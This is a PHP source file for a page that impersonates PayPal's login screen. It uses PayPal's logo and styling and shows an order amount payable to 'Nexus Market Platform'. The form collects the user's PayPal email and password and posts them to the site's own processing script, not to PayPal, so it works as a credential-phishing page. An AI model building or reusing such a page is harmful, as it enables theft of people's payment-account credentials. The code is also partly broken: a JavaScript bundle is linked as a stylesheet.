<?php
// paypal_login.php
session_start();
if (!isset($_SESSION['user_id'])) {
    header("Location: login.php");
    exit;
}

$amount = isset($_GET['amount']) ? (float)$_GET['amount'] : 0.00;
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Log in to your PayPal account</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body { background: #f7f9fa; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
        .paypal-card { background: #fff; width: 100%; max-width: 400px; padding: 40px; border-radius: 8px; box-shadow: 0 2px 12px rgba(0,0,0,0.05); text-align: center; }
        .logo { width: 120px; margin-bottom: 30px; }
        .form-control { border-radius: 4px; padding: 12px; border: 1px solid #d1d1d1; font-size: 16px; margin-bottom: 15px; }
        .btn-primary { background: #0070ba; border: none; padding: 12px; width: 100%; font-weight: bold; border-radius: 20px; margin-top: 10px; }
        .btn-primary:hover { background: #005ea6; }
        .divider { display: flex; align-items: center; text-align: center; color: #6c757d; font-size: 12px; margin: 20px 0; }
        .divider::before, .divider::after { content: ''; flex: 1; border-bottom: 1px solid #d1d1d1; }
        .divider::before { margin-right: 10px; }
        .divider::after { margin-left: 10px; }
    </style>
</head>
<body>

<div class="paypal-card animate-fade-in">
    <img src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_111x69.jpg" class="logo" alt="PayPal">
    
    <form action="paypal_process.php" method="POST">
        <input type="hidden" name="order_amount" value="<?php echo $amount; ?>">
        <input type="email" name="email" class="form-control" placeholder="Email or mobile number" required>
        <input type="password" name="password" class="form-control" placeholder="Password" required>
        
        <div class="text-start mb-3">
            <a href="#" class="text-decoration-none small fw-bold" style="color: #0070ba;">Forgot password?</a>
        </div>

        <button type="submit" name="paypal_login" class="btn btn-primary">Log In</button>
        
        <div class="divider">or</div>
        
        <button type="button" class="btn btn-outline-secondary w-100 rounded-pill py-2 fw-bold" style="border-width: 2px;">Sign Up</button>
    </form>

    <div class="mt-4 small opacity-75">
        <p class="mb-0 text-muted">Payable to: Nexus Market Platform</p>
        <p class="fw-bold text-dark">Amount: $<?php echo number_format($amount, 2); ?></p>
    </div>
</div>

</body>
</html>
